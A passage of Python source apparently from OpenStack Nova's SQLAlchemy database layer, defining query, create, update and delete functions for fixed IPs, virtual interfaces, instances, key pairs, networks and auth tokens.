'leased': False,\n                             'updated_at': utils.utcnow()},\n                             synchronize_session='fetch')\n    return result\n\n\n@require_context\ndef fixed_ip_get(context, id, session=None):\n    result = model_query(context, models.FixedIp, session=session).\\\n                     filter_by(id=id).\\\n                     first()\n    if not result:\n        raise exception.FixedIpNotFound(id=id)\n\n    # FIXME(sirp): shouldn't we just use project_only here to restrict the\n    # results?\n    if is_user_context(context) and result['instance_id'] is not None:\n        instance = instance_get(context, result['instance_id'], session)\n        authorize_project_context(context, instance.project_id)\n\n    return result\n\n\n@require_admin_context\ndef fixed_ip_get_all(context, session=None):\n    result = model_query(context, models.FixedIp, session=session,\n                         read_deleted=\"yes\").\\\n                     all()\n    if not result:\n        raise exception.NoFixedIpsDefined()\n\n    return result\n\n\n@require_context\ndef fixed_ip_get_by_address(context, address, session=None):\n    result = model_query(context, models.FixedIp, session=session,\n                         read_deleted=\"yes\").\\\n                     filter_by(address=address).\\\n                     first()\n    if not result:\n        raise exception.FixedIpNotFoundForAddress(address=address)\n\n    # NOTE(sirp): shouldn't we just use project_only here to restrict the\n    # results?\n    if is_user_context(context) and result['instance_id'] is not None:\n        instance = instance_get(context, result['instance_id'], session)\n        authorize_project_context(context, instance.project_id)\n\n    return result\n\n\n@require_context\ndef fixed_ip_get_by_instance(context, instance_id):\n    result = model_query(context, models.FixedIp, read_deleted=\"no\").\\\n                 filter_by(instance_id=instance_id).\\\n                 all()\n\n    if not result:\n        raise exception.FixedIpNotFoundForInstance(instance_id=instance_id)\n\n    return result\n\n\n@require_context\ndef fixed_ip_get_by_network_host(context, network_id, host):\n    result = model_query(context, models.FixedIp, read_deleted=\"no\").\\\n                 filter_by(network_id=network_id).\\\n                 filter_by(host=host).\\\n                 first()\n\n    if not result:\n        raise exception.FixedIpNotFoundForNetworkHost(network_id=network_id,\n                                                      host=host)\n    return result\n\n\n@require_context\ndef fixed_ips_by_virtual_interface(context, vif_id):\n    result = model_query(context, models.FixedIp, read_deleted=\"no\").\\\n                 filter_by(virtual_interface_id=vif_id).\\\n                 all()\n\n    return result\n\n\n@require_admin_context\ndef fixed_ip_get_network(context, address):\n    fixed_ip_ref = fixed_ip_get_by_address(context, address)\n    return fixed_ip_ref.network\n\n\n@require_context\ndef fixed_ip_update(context, address, values):\n    session = get_session()\n    with session.begin():\n        fixed_ip_ref = fixed_ip_get_by_address(context,\n                                               address,\n                                               session=session)\n        fixed_ip_ref.update(values)\n        fixed_ip_ref.save(session=session)\n\n\n###################\n\n\n@require_context\ndef virtual_interface_create(context, values):\n    \"\"\"Create a new virtual interface record in the database.\n\n    :param values: = dict containing column values\n    \"\"\"\n    try:\n        vif_ref = models.VirtualInterface()\n        vif_ref.update(values)\n        vif_ref.save()\n    except IntegrityError:\n        raise exception.VirtualInterfaceCreateException()\n\n    return vif_ref\n\n\n@require_context\ndef _virtual_interface_query(context, session=None):\n    return model_query(context, models.VirtualInterface, session=session,\n                       read_deleted=\"yes\")\n\n\n@require_context\ndef virtual_interface_get(context, vif_id, session=None):\n    \"\"\"Gets a virtual interface from the table.\n\n    :param vif_id: = id of the virtual interface\n    \"\"\"\n    vif_ref = _virtual_interface_query(context, session=session).\\\n                      filter_by(id=vif_id).\\\n                      first()\n    return vif_ref\n\n\n@require_context\ndef virtual_interface_get_by_address(context, address):\n    \"\"\"Gets a virtual interface from the table.\n\n    :param address: = the address of the interface you're looking to get\n    \"\"\"\n    vif_ref = _virtual_interface_query(context).\\\n                      filter_by(address=address).\\\n                      first()\n    return vif_ref\n\n\n@require_context\ndef virtual_interface_get_by_uuid(context, vif_uuid):\n    \"\"\"Gets a virtual interface from the table.\n\n    :param vif_uuid: the uuid of the interface you're looking to get\n    \"\"\"\n    vif_ref = _virtual_interface_query(context).\\\n                      filter_by(uuid=vif_uuid).\\\n                      first()\n    return vif_ref\n\n\n@require_context\n@require_instance_exists\ndef virtual_interface_get_by_instance(context, instance_id):\n    \"\"\"Gets all virtual interfaces for instance.\n\n    :param instance_id: = id of the instance to retrieve vifs for\n    \"\"\"\n    vif_refs = _virtual_interface_query(context).\\\n                       filter_by(instance_id=instance_id).\\\n                       all()\n    return vif_refs\n\n\n@require_context\ndef virtual_interface_get_by_instance_and_network(context, instance_id,\n                                                           network_id):\n    \"\"\"Gets virtual interface for instance that's associated with network.\"\"\"\n    vif_ref = _virtual_interface_query(context).\\\n                      filter_by(instance_id=instance_id).\\\n                      filter_by(network_id=network_id).\\\n                      first()\n    return vif_ref\n\n\n@require_context\ndef virtual_interface_delete(context, vif_id):\n    \"\"\"Delete virtual interface record from the database.\n\n    :param vif_id: = id of vif to delete\n    \"\"\"\n    session = get_session()\n    vif_ref = virtual_interface_get(context, vif_id, session)\n    with session.begin():\n        session.delete(vif_ref)\n\n\n@require_context\ndef virtual_interface_delete_by_instance(context, instance_id):\n    \"\"\"Delete virtual interface records that are associated\n    with the instance given by instance_id.\n\n    :param instance_id: = id of instance\n    \"\"\"\n    vif_refs = virtual_interface_get_by_instance(context, instance_id)\n    for vif_ref in vif_refs:\n        virtual_interface_delete(context, vif_ref['id'])\n\n\n@require_context\ndef virtual_interface_get_all(context):\n    \"\"\"Get all vifs\"\"\"\n    vif_refs = _virtual_interface_query(context).all()\n    return vif_refs\n\n\n###################\n\n\ndef _metadata_refs(metadata_dict, meta_class):\n    metadata_refs = []\n    if metadata_dict:\n        for k, v in metadata_dict.iteritems():\n            metadata_ref = meta_class()\n            metadata_ref['key'] = k\n            metadata_ref['value'] = v\n            metadata_refs.append(metadata_ref)\n    return metadata_refs\n\n\n@require_context\ndef instance_create(context, values):\n    \"\"\"Create a new Instance record in the database.\n\n    context - request context object\n    values - dict containing column values.\n    \"\"\"\n    values = values.copy()\n    values['metadata'] = _metadata_refs(values.get('metadata'),\n                                        models.InstanceMetadata)\n    instance_ref = models.Instance()\n    if not values.get('uuid'):\n        values['uuid'] = str(utils.gen_uuid())\n    instance_ref.update(values)\n\n    session = get_session()\n    with session.begin():\n        instance_ref.save(session=session)\n\n    # and creat the info_cache table entry for instance\n    instance_info_cache_create(context, {'instance_id': instance_ref['uuid']})\n\n    return instance_ref\n\n\n@require_admin_context\ndef instance_data_get_for_project(context, project_id):\n    result = model_query(context,\n                         func.count(models.Instance.id),\n                         func.sum(models.Instance.vcpus),\n                         func.sum(models.Instance.memory_mb),\n                         read_deleted=\"no\").\\\n                     filter_by(project_id=project_id).\\\n                     first()\n    # NOTE(vish): convert None to 0\n    return (result[0] or 0, result[1] or 0, result[2] or 0)\n\n\n@require_context\ndef instance_destroy(context, instance_id):\n    session = get_session()\n    with session.begin():\n        if utils.is_uuid_like(instance_id):\n            instance_ref = instance_get_by_uuid(context, instance_id,\n                    session=session)\n            instance_id = instance_ref['id']\n        else:\n            instance_ref = instance_get(context, instance_id,\n                    session=session)\n        session.query(models.Instance).\\\n                filter_by(id=instance_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.SecurityGroupInstanceAssociation).\\\n                filter_by(instance_id=instance_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.InstanceMetadata).\\\n                filter_by(instance_id=instance_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.BlockDeviceMapping).\\\n                filter_by(instance_id=instance_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n        instance_info_cache_delete(context, instance_ref['uuid'],\n                                   session=session)\n    return instance_ref\n\n\n@require_context\ndef instance_get_by_uuid(context, uuid, session=None):\n    result = _build_instance_get(context, session=session).\\\n                filter_by(uuid=uuid).\\\n                first()\n\n    if not result:\n        raise exception.InstanceNotFound(instance_id=uuid)\n\n    return result\n\n\n@require_context\ndef instance_get(context, instance_id, session=None):\n    result = _build_instance_get(context, session=session).\\\n                filter_by(id=instance_id).\\\n                first()\n\n    if not result:\n        raise exception.InstanceNotFound(instance_id=instance_id)\n\n    return result\n\n\n@require_context\ndef _build_instance_get(context, session=None):\n    return model_query(context, models.Instance, session=session,\n                        project_only=True).\\\n            options(joinedload_all('security_groups.rules')).\\\n            options(joinedload('info_cache')).\\\n            options(joinedload('volumes')).\\\n            options(joinedload('metadata')).\\\n            options(joinedload('instance_type'))\n\n\n@require_admin_context\ndef instance_get_all(context):\n    return model_query(context, models.Instance).\\\n                   options(joinedload('info_cache')).\\\n                   options(joinedload('security_groups')).\\\n                   options(joinedload('metadata')).\\\n                   options(joinedload('instance_type')).\\\n                   all()\n\n\n@require_context\ndef instance_get_all_by_filters(context, filters, sort_key, sort_dir):\n    \"\"\"Return instances that match all filters.  Deleted instances\n    will be returned by default, unless there's a filter that says\n    otherwise\"\"\"\n\n    def _regexp_filter_by_metadata(instance, meta):\n        inst_metadata = [{node['key']: node['value']}\n                         for node in instance['metadata']]\n        if isinstance(meta, list):\n            for node in meta:\n                if node not in inst_metadata:\n                    return False\n        elif isinstance(meta, dict):\n            for k, v in meta.iteritems():\n                if {k: v} not in inst_metadata:\n                    return False\n        return True\n\n    def _regexp_filter_by_column(instance, filter_name, filter_re):\n        try:\n            v = getattr(instance, filter_name)\n        except AttributeError:\n            return True\n        if v and filter_re.match(str(v)):\n            return True\n        return False\n\n    sort_fn = {'desc': desc, 'asc': asc}\n\n    session = get_session()\n    query_prefix = session.query(models.Instance).\\\n            options(joinedload('info_cache')).\\\n            options(joinedload('security_groups')).\\\n            options(joinedload('metadata')).\\\n            options(joinedload('instance_type')).\\\n            order_by(sort_fn[sort_dir](getattr(models.Instance, sort_key)))\n\n    # Make a copy of the filters dictionary to use going forward, as we'll\n    # be modifying it and we shouldn't affect the caller's use of it.\n    filters = filters.copy()\n\n    if 'changes-since' in filters:\n        changes_since = utils.normalize_time(filters['changes-since'])\n        query_prefix = query_prefix.\\\n                            filter(models.Instance.updated_at > changes_since)\n\n    if 'deleted' in filters:\n        # Instances can be soft or hard deleted and the query needs to\n        # include or exclude both\n        if filters.pop('deleted'):\n            deleted = or_(models.Instance.deleted == True,\n                          models.Instance.vm_state == vm_states.SOFT_DELETE)\n            query_prefix = query_prefix.filter(deleted)\n        else:\n            query_prefix = query_prefix.\\\n                    filter_by(deleted=False).\\\n                    filter(models.Instance.vm_state != vm_states.SOFT_DELETE)\n\n    if not context.is_admin:\n        # If we're not admin context, add appropriate filter..\n        if context.project_id:\n            filters['project_id'] = context.project_id\n        else:\n            filters['user_id'] = context.user_id\n\n    # Filters for exact matches that we can do along with the SQL query...\n    # For other filters that don't match this, we will do regexp matching\n    exact_match_filter_names = ['project_id', 'user_id', 'image_ref',\n            'vm_state', 'instance_type_id', 'uuid']\n\n    # Filter the query\n    query_prefix = exact_filter(query_prefix, models.Instance,\n                                filters, exact_match_filter_names)\n\n    instances = query_prefix.all()\n    if not instances:\n        return []\n\n    # Now filter on everything else for regexp matching..\n    # For filters not in the list, we'll attempt to use the filter_name\n    # as a column name in Instance..\n    regexp_filter_funcs = {}\n\n    for filter_name in filters.iterkeys():\n        filter_func = regexp_filter_funcs.get(filter_name, None)\n        filter_re = re.compile(str(filters[filter_name]))\n        if filter_func:\n            filter_l = lambda instance: filter_func(instance, filter_re)\n        elif filter_name == 'metadata':\n            filter_l = lambda instance: _regexp_filter_by_metadata(instance,\n                    filters[filter_name])\n        else:\n            filter_l = lambda instance: _regexp_filter_by_column(instance,\n                    filter_name, filter_re)\n        instances = filter(filter_l, instances)\n        if not instances:\n            break\n\n    return instances\n\n\n@require_context\ndef instance_get_active_by_window(context, begin, end=None, project_id=None):\n    \"\"\"Return instances that were active during window.\"\"\"\n    session = get_session()\n    query = session.query(models.Instance)\n\n    query = query.filter(or_(models.Instance.terminated_at == None,\n                             models.Instance.terminated_at > begin))\n    if end:\n        query = query.filter(models.Instance.launched_at < end)\n    if project_id:\n        query = query.filter_by(project_id=project_id)\n\n    return query.all()\n\n\n@require_admin_context\ndef instance_get_active_by_window_joined(context, begin, end=None,\n                                         project_id=None):\n    \"\"\"Return instances and joins that were active during window.\"\"\"\n    session = get_session()\n    query = session.query(models.Instance)\n\n    query = query.options(joinedload('info_cache')).\\\n                  options(joinedload('security_groups')).\\\n                  options(joinedload('metadata')).\\\n                  options(joinedload('instance_type')).\\\n                  filter(or_(models.Instance.terminated_at == None,\n                             models.Instance.terminated_at > begin))\n    if end:\n        query = query.filter(models.Instance.launched_at < end)\n    if project_id:\n        query = query.filter_by(project_id=project_id)\n\n    return query.all()\n\n\n@require_admin_context\ndef _instance_get_all_query(context, project_only=False):\n    return model_query(context, models.Instance, project_only=project_only).\\\n                   options(joinedload('info_cache')).\\\n                   options(joinedload('security_groups')).\\\n                   options(joinedload('metadata')).\\\n                   options(joinedload('instance_type'))\n\n\n@require_admin_context\ndef instance_get_all_by_host(context, host):\n    return _instance_get_all_query(context).filter_by(host=host).all()\n\n\n@require_context\ndef instance_get_all_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n    return _instance_get_all_query(context).\\\n                    filter_by(project_id=project_id).\\\n                    all()\n\n\n@require_context\ndef instance_get_all_by_reservation(context, reservation_id):\n    return _instance_get_all_query(context, project_only=True).\\\n                    filter_by(reservation_id=reservation_id).\\\n                    all()\n\n\n# NOTE(jkoelker) This is only being left here for compat with floating\n#                ips. Currently the network_api doesn't return floaters\n#                in network_info. Once it starts return the model. This\n#                function and its call in compute/manager.py on 1829 can\n#                go away\n@require_context\ndef instance_get_floating_address(context, instance_id):\n    fixed_ips = fixed_ip_get_by_instance(context, instance_id)\n    if not fixed_ips:\n        return None\n    # NOTE(tr3buchet): this only gets the first fixed_ip\n    # won't find floating ips associated with other fixed_ips\n    floating_ips = floating_ip_get_by_fixed_address(context,\n                                                    fixed_ips[0]['address'])\n    if not floating_ips:\n        return None\n    # NOTE(vish): this just returns the first floating ip\n    return floating_ips[0]['address']\n\n\n@require_admin_context\ndef instance_get_all_hung_in_rebooting(context, reboot_window, session=None):\n    reboot_window = datetime.datetime.utcnow() - datetime.timedelta(\n            seconds=reboot_window)\n\n    if not session:\n        session = get_session()\n\n    results = session.query(models.Instance).\\\n            filter(models.Instance.updated_at <= reboot_window).\\\n            filter_by(task_state=\"rebooting\").all()\n\n    return results\n\n\n@require_context\ndef instance_test_and_set(context, instance_id, attr, ok_states,\n                          new_state, session=None):\n    \"\"\"Atomically check if an instance is in a valid state, and if it is, set\n    the instance into a new state.\n    \"\"\"\n    if not session:\n        session = get_session()\n\n    with session.begin():\n        query = model_query(context, models.Instance, session=session,\n                            project_only=True)\n\n        if utils.is_uuid_like(instance_id):\n            query = query.filter_by(uuid=instance_id)\n        else:\n            query = query.filter_by(id=instance_id)\n\n        # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n        #             then this has concurrency issues\n        instance = query.with_lockmode('update').first()\n\n        state = instance[attr]\n        if state not in ok_states:\n            raise exception.InstanceInvalidState(\n                attr=attr,\n                instance_uuid=instance['uuid'],\n                state=state,\n                method='instance_test_and_set')\n\n        instance[attr] = new_state\n        instance.save(session=session)\n\n\n@require_context\ndef instance_update(context, instance_id, values):\n    session = get_session()\n\n    if utils.is_uuid_like(instance_id):\n        instance_ref = instance_get_by_uuid(context, instance_id,\n                                            session=session)\n    else:\n        instance_ref = instance_get(context, instance_id, session=session)\n\n    metadata = values.get('metadata')\n    if metadata is not None:\n        instance_metadata_update(context,\n                                 instance_ref['id'],\n                                 values.pop('metadata'),\n                                 delete=True)\n    with session.begin():\n        instance_ref.update(values)\n        instance_ref.save(session=session)\n\n    return instance_ref\n\n\ndef instance_add_security_group(context, instance_uuid, security_group_id):\n    \"\"\"Associate the given security group with the given instance\"\"\"\n    session = get_session()\n    with session.begin():\n        instance_ref = instance_get_by_uuid(context, instance_uuid,\n                                            session=session)\n        security_group_ref = security_group_get(context,\n                                                security_group_id,\n                                                session=session)\n        instance_ref.security_groups += [security_group_ref]\n        instance_ref.save(session=session)\n\n\n@require_context\ndef instance_remove_security_group(context, instance_uuid, security_group_id):\n    \"\"\"Disassociate the given security group from the given instance\"\"\"\n    session = get_session()\n    instance_ref = instance_get_by_uuid(context, instance_uuid,\n                                        session=session)\n    session.query(models.SecurityGroupInstanceAssociation).\\\n                filter_by(instance_id=instance_ref['id']).\\\n                filter_by(security_group_id=security_group_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef instance_action_create(context, values):\n    \"\"\"Create an instance action from the values dictionary.\"\"\"\n    action_ref = models.InstanceActions()\n    action_ref.update(values)\n\n    session = get_session()\n    with session.begin():\n        action_ref.save(session=session)\n    return action_ref\n\n\n@require_admin_context\ndef instance_get_actions(context, instance_uuid):\n    \"\"\"Return the actions associated to the given instance id\"\"\"\n    session = get_session()\n    return session.query(models.InstanceActions).\\\n                   filter_by(instance_uuid=instance_uuid).\\\n                   all()\n\n\n@require_context\ndef instance_get_id_to_uuid_mapping(context, ids):\n    session = get_session()\n    instances = session.query(models.Instance).\\\n                        filter(models.Instance.id.in_(ids)).\\\n                        all()\n    mapping = {}\n    for instance in instances:\n        mapping[instance['id']] = instance['uuid']\n    return mapping\n\n\n###################\n\n\n@require_context\ndef instance_info_cache_create(context, values):\n    \"\"\"Create a new instance cache record in the table.\n\n    :param context: = request context object\n    :param values: = dict containing column values\n    \"\"\"\n    info_cache = models.InstanceInfoCache()\n    info_cache.update(values)\n\n    session = get_session()\n    with session.begin():\n        info_cache.save(session=session)\n    return info_cache\n\n\n@require_context\ndef instance_info_cache_get(context, instance_uuid, session=None):\n    \"\"\"Gets an instance info cache from the table.\n\n    :param instance_uuid: = uuid of the info cache's instance\n    :param session: = optional session object\n    \"\"\"\n    session = session or get_session()\n\n    info_cache = session.query(models.InstanceInfoCache).\\\n                         filter_by(instance_id=instance_uuid).\\\n                         first()\n    return info_cache\n\n\n@require_context\ndef instance_info_cache_update(context, instance_uuid, values,\n                               session=None):\n    \"\"\"Update an instance info cache record in the table.\n\n    :param instance_uuid: = uuid of info cache's instance\n    :param values: = dict containing column values to update\n    :param session: = optional session object\n    \"\"\"\n    session = session or get_session()\n    info_cache = instance_info_cache_get(context, instance_uuid,\n                                         session=session)\n\n    if info_cache:\n        info_cache.update(values)\n        info_cache.save(session=session)\n    else:\n        # NOTE(tr3buchet): just in case someone blows away an instance's\n        #                  cache entry\n        values['instance_id'] = instance_uuid\n        info_cache = instance_info_cache_create(context, values)\n\n    return info_cache\n\n\n@require_context\ndef instance_info_cache_delete(context, instance_uuid, session=None):\n    \"\"\"Deletes an existing instance_info_cache record\n\n    :param instance_uuid: = uuid of the instance tied to the cache record\n    :param session: = optional session object\n    \"\"\"\n    values = {'deleted': True,\n              'deleted_at': utils.utcnow()}\n    instance_info_cache_update(context, instance_uuid, values, session)\n\n\n###################\n\n\n@require_context\ndef key_pair_create(context, values):\n    key_pair_ref = models.KeyPair()\n    key_pair_ref.update(values)\n    key_pair_ref.save()\n    return key_pair_ref\n\n\n@require_context\ndef key_pair_destroy(context, user_id, name):\n    authorize_user_context(context, user_id)\n    session = get_session()\n    with session.begin():\n        key_pair_ref = key_pair_get(context, user_id, name, session=session)\n        key_pair_ref.delete(session=session)\n\n\n@require_context\ndef key_pair_destroy_all_by_user(context, user_id):\n    authorize_user_context(context, user_id)\n    session = get_session()\n    with session.begin():\n        session.query(models.KeyPair).\\\n                filter_by(user_id=user_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef key_pair_get(context, user_id, name, session=None):\n    authorize_user_context(context, user_id)\n    result = model_query(context, models.KeyPair, session=session).\\\n                     filter_by(user_id=user_id).\\\n                     filter_by(name=name).\\\n                     first()\n\n    if not result:\n        raise exception.KeypairNotFound(user_id=user_id, name=name)\n\n    return result\n\n\n@require_context\ndef key_pair_get_all_by_user(context, user_id):\n    authorize_user_context(context, user_id)\n    return model_query(context, models.KeyPair, read_deleted=\"no\").\\\n                   filter_by(user_id=user_id).\\\n                   all()\n\n\n###################\n\n\n@require_admin_context\ndef network_associate(context, project_id, force=False):\n    \"\"\"Associate a project with a network.\n\n    called by project_get_networks under certain conditions\n    and network manager add_network_to_project()\n\n    only associate if the project doesn't already have a network\n    or if force is True\n\n    force solves race condition where a fresh project has multiple instance\n    builds simultaneously picked up by multiple network hosts which attempt\n    to associate the project with multiple networks\n    force should only be used as a direct consequence of user request\n    all automated requests should not use force\n    \"\"\"\n    session = get_session()\n    with session.begin():\n\n        def network_query(project_filter):\n            return model_query(context, models.Network, session=session,\n                              read_deleted=\"no\").\\\n                           filter_by(project_id=project_filter).\\\n                           with_lockmode('update').\\\n                           first()\n\n        if not force:\n            # find out if project has a network\n            network_ref = network_query(project_id)\n\n        if force or not network_ref:\n            # in force mode or project doesn't have a network so associate\n            # with a new network\n\n            # get new network\n            network_ref = network_query(None)\n            if not network_ref:\n                raise db.NoMoreNetworks()\n\n            # associate with network\n            # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n            #             then this has concurrency issues\n            network_ref['project_id'] = project_id\n            session.add(network_ref)\n    return network_ref\n\n\n@require_admin_context\ndef network_count(context):\n    return model_query(context, models.Network).count()\n\n\n@require_admin_context\ndef _network_ips_query(context, network_id):\n    return model_query(context, models.FixedIp, read_deleted=\"no\").\\\n                   filter_by(network_id=network_id)\n\n\n@require_admin_context\ndef network_count_reserved_ips(context, network_id):\n    return _network_ips_query(context, network_id).\\\n                    filter_by(reserved=True).\\\n                    count()\n\n\n@require_admin_context\ndef network_create_safe(context, values):\n    if values.get('vlan'):\n        if model_query(context, models.Network, read_deleted=\"no\")\\\n                      .filter_by(vlan=values['vlan'])\\\n                      .first():\n            raise exception.DuplicateVlan(vlan=values['vlan'])\n\n    network_ref = models.Network()\n    network_ref['uuid'] = str(utils.gen_uuid())\n    network_ref.update(values)\n\n    try:\n        network_ref.save()\n        return network_ref\n    except IntegrityError:\n        return None\n\n\n@require_admin_context\ndef network_delete_safe(context, network_id):\n    session = get_session()\n    with session.begin():\n        result = session.query(models.FixedIp).\\\n                         filter_by(network_id=network_id).\\\n                         filter_by(deleted=False).\\\n                         filter_by(allocated=True).\\\n                         all()\n        if result:\n            raise exception.NetworkInUse(network_id=network_id)\n        network_ref = network_get(context, network_id=network_id,\n                                  session=session)\n        session.query(models.FixedIp).\\\n                filter_by(network_id=network_id).\\\n                filter_by(deleted=False).\\\n                update({'deleted': True,\n                        'updated_at': literal_column('updated_at'),\n                        'deleted_at': utils.utcnow()})\n        session.delete(network_ref)\n\n\n@require_admin_context\ndef network_disassociate(context, network_id):\n    network_update(context, network_id, {'project_id': None,\n                                         'host': None})\n\n\n@require_context\ndef network_get(context, network_id, session=None):\n    result = model_query(context, models.Network, session=session,\n                         project_only=True).\\\n                    filter_by(id=network_id).\\\n                    first()\n\n    if not result:\n        raise exception.NetworkNotFound(network_id=network_id)\n\n    return result\n\n\n@require_admin_context\ndef network_get_all(context):\n    result = model_query(context, models.Network, read_deleted=\"no\").all()\n\n    if not result:\n        raise exception.NoNetworksFound()\n\n    return result\n\n\n@require_admin_context\ndef network_get_all_by_uuids(context, network_uuids, project_id=None):\n    project_or_none = or_(models.Network.project_id == project_id,\n                          models.Network.project_id == None)\n    result = model_query(context, models.Network, read_deleted=\"no\").\\\n                filter(models.Network.uuid.in_(network_uuids)).\\\n                filter(project_or_none).\\\n                all()\n\n    if not result:\n        raise exception.NoNetworksFound()\n\n    #check if host is set to all of the networks\n    # returned in the result\n    for network in result:\n        if network['host'] is None:\n            raise exception.NetworkHostNotSet(network_id=network['id'])\n\n    #check if the result contains all the networks\n    #we are looking for\n    for network_uuid in network_uuids:\n        found = False\n        for network in result:\n            if network['uuid'] == network_uuid:\n                found = True\n                break\n        if not found:\n            if project_id:\n                raise exception.NetworkNotFoundForProject(\n                      network_uuid=network_uuid, project_id=context.project_id)\n            raise exception.NetworkNotFound(network_id=network_uuid)\n\n    return result\n\n# NOTE(vish): pylint complains because of the long method name, but\n#             it fits with the names of the rest of the methods\n# pylint: disable=C0103\n\n\n@require_admin_context\ndef network_get_associated_fixed_ips(context, network_id, host=None):\n    # FIXME(sirp): since this returns fixed_ips, this would be better named\n    # fixed_ip_get_all_by_network.\n    # NOTE(vish): The ugly joins here are to solve a performance issue and\n    #             should be removed once we can add and remove leases\n    #             without regenerating the whole list\n    vif_and = and_(models.VirtualInterface.id ==\n                   models.FixedIp.virtual_interface_id,\n                   models.VirtualInterface.deleted == False)\n    inst_and = and_(models.Instance.id == models.FixedIp.instance_id,\n                    models.Instance.deleted == False)\n    session = get_session()\n    query = session.query(models.FixedIp.address,\n                          models.FixedIp.instance_id,\n                          models.FixedIp.network_id,\n                          models.FixedIp.virtual_interface_id,\n                          models.VirtualInterface.address,\n                          models.Instance.hostname,\n                          models.Instance.updated_at,\n                          models.Instance.created_at).\\\n                          filter(models.FixedIp.deleted == False).\\\n                          filter(models.FixedIp.network_id == network_id).\\\n                          filter(models.FixedIp.allocated == True).\\\n                          join((models.VirtualInterface, vif_and)).\\\n                          join((models.Instance, inst_and)).\\\n                          filter(models.FixedIp.instance_id != None).\\\n                          filter(models.FixedIp.virtual_interface_id != None)\n    if host:\n        query = query.filter(models.Instance.host == host)\n    result = query.all()\n    data = []\n    for datum in result:\n        cleaned = {}\n        cleaned['address'] = datum[0]\n        cleaned['instance_id'] = datum[1]\n        cleaned['network_id'] = datum[2]\n        cleaned['vif_id'] = datum[3]\n        cleaned['vif_address'] = datum[4]\n        cleaned['instance_hostname'] = datum[5]\n        cleaned['instance_updated'] = datum[6]\n        cleaned['instance_created'] = datum[7]\n        data.append(cleaned)\n    return data\n\n\n@require_admin_context\ndef _network_get_query(context, session=None):\n    return model_query(context, models.Network, session=session,\n                       read_deleted=\"no\")\n\n\n@require_admin_context\ndef network_get_by_bridge(context, bridge):\n    result = _network_get_query(context).filter_by(bridge=bridge).first()\n\n    if not result:\n        raise exception.NetworkNotFoundForBridge(bridge=bridge)\n\n    return result\n\n\n@require_admin_context\ndef network_get_by_uuid(context, uuid):\n    result = _network_get_query(context).filter_by(uuid=uuid).first()\n\n    if not result:\n        raise exception.NetworkNotFoundForUUID(uuid=uuid)\n\n    return result\n\n\n@require_admin_context\ndef network_get_by_cidr(context, cidr):\n    result = _network_get_query(context).\\\n                filter(or_(models.Network.cidr == cidr,\n                           models.Network.cidr_v6 == cidr)).\\\n                first()\n\n    if not result:\n        raise exception.NetworkNotFoundForCidr(cidr=cidr)\n\n    return result\n\n\n@require_admin_context\ndef network_get_by_instance(context, instance_id):\n    # note this uses fixed IP to get to instance\n    # only works for networks the instance has an IP from\n    result = _network_get_query(context).\\\n                 filter_by(instance_id=instance_id).\\\n                 first()\n\n    if not result:\n        raise exception.NetworkNotFoundForInstance(instance_id=instance_id)\n\n    return result\n\n\n@require_admin_context\ndef network_get_all_by_instance(context, instance_id):\n    result = _network_get_query(context).\\\n                 filter_by(instance_id=instance_id).\\\n                 all()\n\n    if not result:\n        raise exception.NetworkNotFoundForInstance(instance_id=instance_id)\n\n    return result\n\n\n@require_admin_context\ndef network_get_all_by_host(context, host):\n    session = get_session()\n    fixed_ip_query = model_query(context, models.FixedIp.network_id,\n                                 session=session).\\\n                        filter(models.FixedIp.host == host)\n    # NOTE(vish): return networks that have host set\n    #             or that have a fixed ip with host set\n    host_filter = or_(models.Network.host == host,\n                      models.Network.id.in_(fixed_ip_query.subquery()))\n    return _network_get_query(context, session=session).\\\n                       filter(host_filter).\\\n                       all()\n\n\n@require_admin_context\ndef network_set_host(context, network_id, host_id):\n    session = get_session()\n    with session.begin():\n        network_ref = _network_get_query(context, session=session).\\\n                              filter_by(id=network_id).\\\n                              with_lockmode('update').\\\n                              first()\n\n        if not network_ref:\n            raise exception.NetworkNotFound(network_id=network_id)\n\n        # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n        #             then this has concurrency issues\n        if not network_ref['host']:\n            network_ref['host'] = host_id\n            session.add(network_ref)\n\n    return network_ref['host']\n\n\n@require_context\ndef network_update(context, network_id, values):\n    session = get_session()\n    with session.begin():\n        network_ref = network_get(context, network_id, session=session)\n        network_ref.update(values)\n        network_ref.save(session=session)\n        return network_ref\n\n\n###################\n\n\ndef queue_get_for(context, topic, physical_node_id):\n    # FIXME(ja): this should be servername?\n    return \"%s.%s\" % (topic, physical_node_id)\n\n\n###################\n\n\n@require_admin_context\ndef iscsi_target_count_by_host(context, host):\n    return model_query(context, models.IscsiTarget).\\\n                   filter_by(host=host).\\\n                   count()\n\n\n@require_admin_context\ndef iscsi_target_create_safe(context, values):\n    iscsi_target_ref = models.IscsiTarget()\n    for (key, value) in values.iteritems():\n        iscsi_target_ref[key] = value\n    try:\n        iscsi_target_ref.save()\n        return iscsi_target_ref\n    except IntegrityError:\n        return None\n\n\n###################\n\n\n@require_admin_context\ndef auth_token_destroy(context, token_id):\n    session = get_session()\n    with session.begin():\n        token_ref = auth_token_get(context, token_id, session=session)\n        token_ref.delete(session=session)\n\n\n@require_admin_context\ndef auth_token_get(context, token_hash, session=None):\n    result = model_query(context, models.AuthToken, session=session).\\\n                  filter_by(token_hash=token_hash).\\\n                  first()\n\n    if not result:\n        raise exception.AuthTokenNotFound(token=token_hash)\n\n    return result\n\n\n@require_admin_context\ndef auth_token_update(context, token_hash, values):\n    session = get_session()\n    with session.begin():\n        token_ref = auth_token_get(context, token_hash, session=session)\n        token_ref.update(values)\n        token_ref.save(session=session)\n\n\n@require_admin_context\ndef auth_token_create(context, token):\n    tk = models.AuthToken()\n    tk.update(token)\n    tk.save()\n    return 